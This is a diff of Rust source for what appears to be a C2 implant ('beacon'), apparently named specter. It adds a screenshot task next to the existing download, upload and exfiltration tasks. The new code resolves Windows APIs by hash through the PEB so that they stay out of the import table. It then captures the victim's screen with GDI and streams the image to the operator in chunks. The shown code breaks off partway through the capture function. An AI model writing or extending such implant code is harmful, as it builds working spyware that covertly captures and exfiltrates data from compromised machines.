@@ -103,6 +103,7 @@ pub unsafe fn handle(instance: &mut Instance, task: Task, id: u32, results: &mut
         Task::Download { .. } => download_start(instance, &task, id, results),
         Task::Upload { .. } => upload_write(instance, &task, id, results),
         Task::Exfil { action, file_id } => exfil(instance, action, file_id, id, results),
+        Task::Screenshot => screenshot_start(instance, id, results),
         Task::Sleep { .. } | Task::Terminate => {}
     }
 }
@@ -1590,3 +1591,148 @@ pub unsafe fn jobs_tick(instance: &mut Instance, results: &mut Writer) {
         }
     }
 }
+
+// --- screenshot (port of the native SptCmdScreenshot: GDI capture by hash,
+// BMP 24bpp with an 8bpp grayscale fallback for oversized screens; the
+// capture lands in a heap buffer and streams across cycles like a
+// download — the POST body frame is 0x12000, a full-screen BMP is ~7 MiB) --
+
+const H_USER32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("user32.dll");
+const H_GDI32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("gdi32.dll");
+const USER32_DLL: &[u8] = b"user32.dll\0";
+const GDI32_DLL: &[u8] = b"gdi32.dll\0";
+const H_LOAD_LIBRARY_A: u64 = fnv1a64(b"LoadLibraryA");
+const H_GET_SYSTEM_METRICS: u64 = fnv1a64(b"GetSystemMetrics");
+const H_GET_DC: u64 = fnv1a64(b"GetDC");
+const H_RELEASE_DC: u64 = fnv1a64(b"ReleaseDC");
+const H_CREATE_COMPATIBLE_DC: u64 = fnv1a64(b"CreateCompatibleDC");
+const H_CREATE_COMPATIBLE_BITMAP: u64 = fnv1a64(b"CreateCompatibleBitmap");
+const H_SELECT_OBJECT: u64 = fnv1a64(b"SelectObject");
+const H_BIT_BLT: u64 = fnv1a64(b"BitBlt");
+const H_GET_DIBITS: u64 = fnv1a64(b"GetDIBits");
+const H_DELETE_OBJECT: u64 = fnv1a64(b"DeleteObject");
+const H_DELETE_DC: u64 = fnv1a64(b"DeleteDC");
+
+const SM_CXSCREEN: i32 = 0;
+const SM_CYSCREEN: i32 = 1;
+const SRCCOPY: u32 = 0x00CC_0020;
+/// Capture size cap (24bpp 1920x1200 = 6.6 MiB fits; bigger screens fall
+/// back to 8bpp grayscale — the native tiering, against the heap budget).
+const SHOT_CAP: usize = 8 * 1024 * 1024;
+/// Bytes streamed per cycle (same cadence as a download chunk; the
+/// START/CONTINUE records fit the 0x12000 body frame with the results
+/// queue).
+const SHOT_CHUNK: usize = 48 * 1024;
+
+/// One active screenshot stream: the captured BMP (heap) and the cursor.
+pub struct ShotState {
+    pub task_id: u32,
+    pub buf: *mut u8,
+    pub len: usize,
+    pub cursor: usize,
+    pub started: bool,
+}
+
+/// Resolve a module: PEB first, `LoadLibraryA` if absent (winhttp pattern).
+unsafe fn load_module(
+    peb: *const specter_core::peb::Peb,
+    kernel32: *mut c_void,
+    hash: u64,
+    name: &[u8],
+) -> *mut c_void {
+    let mut module = peb::find_module(peb, hash);
+    if module.is_null() && !kernel32.is_null() {
+        let load = peb::find_export(kernel32, H_LOAD_LIBRARY_A);
+        if !load.is_null() {
+            let load = core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(*const u8) -> *mut c_void,
+            >(load as *const core::ffi::c_void);
+            module = load(name.as_ptr());
+        }
+    }
+    module
+}
+
+/// `screenshot`: capture the screen into a heap BMP and arm the stream.
+/// The START record lands on the first tick (download pattern).
+///
+/// # Safety
+///
+/// Beacon thread; kernel32 and the PEB resolved at bootstrap.
+pub unsafe fn screenshot_start(instance: &mut Instance, id: u32, results: &mut Writer) {
+    let kernel32 = instance.kernel32;
+    if instance.screenshot.is_some() {
+        // One stream at a time (the queue drains 48 KiB per cycle anyway).
+        error(kernel32, id, results);
+        return;
+    }
+    let Some(heap) = instance.heap else {
+        error(kernel32, id, results);
+        return;
+    };
+
+    let peb = crate::runtime::bootstrap::get_peb() as *const specter_core::peb::Peb;
+    let user32 = load_module(peb, kernel32, H_USER32, USER32_DLL);
+    if user32.is_null() {
+        error(kernel32, id, results);
+        return;
+    }
+    // user32 links against gdi32: the LoadLibrary of user32 maps it, but a
+    // console host may predate that - resolve explicitly.
+    let gdi32 = load_module(peb, kernel32, H_GDI32, GDI32_DLL);
+    if gdi32.is_null() {
+        error(kernel32, id, results);
+        return;
+    }
+
+    let metrics = peb::find_export(user32, H_GET_SYSTEM_METRICS);
+    let get_dc = peb::find_export(user32, H_GET_DC);
+    let release_dc = peb::find_export(user32, H_RELEASE_DC);
+    let compat_dc = peb::find_export(gdi32, H_CREATE_COMPATIBLE_DC);
+    let compat_bmp = peb::find_export(gdi32, H_CREATE_COMPATIBLE_BITMAP);
+    let select_obj = peb::find_export(gdi32, H_SELECT_OBJECT);
+    let bit_blt = peb::find_export(gdi32, H_BIT_BLT);
+    let get_dibits = peb::find_export(gdi32, H_GET_DIBITS);
+    let delete_obj = peb::find_export(gdi32, H_DELETE_OBJECT);
+    let delete_dc = peb::find_export(gdi32, H_DELETE_DC);
+    if metrics.is_null()
+        || get_dc.is_null()
+        || release_dc.is_null()
+        || compat_dc.is_null()
+        || compat_bmp.is_null()
+        || select_obj.is_null()
+        || bit_blt.is_null()
+        || get_dibits.is_null()
+        || delete_obj.is_null()
+        || delete_dc.is_null()
+    {
+        error(kernel32, id, results);
+        return;
+    }
+
+    let metrics = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(i32) -> i32,
+    >(metrics as *const core::ffi::c_void);
+    let get_dc = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*const c_void) -> *mut c_void,
+    >(get_dc as *const core::ffi::c_void);
+    let release_dc = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*const c_void, *mut c_void) -> i32,
+    >(release_dc as *const core::ffi::c_void);
+    let compat_dc = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*mut c_void) -> *mut c_void,
+    >(compat_dc as *const core::ffi::c_void);
+    let compat_bmp = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*mut c_void, i32, i32) -> *mut c_void,
+    >(compat_bmp as *const core::ffi::c_void);
+    let select_obj = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void,
+    >(select_obj as *const core::ffi::c_void);
+    let bit_blt = core::mem::transmute::<
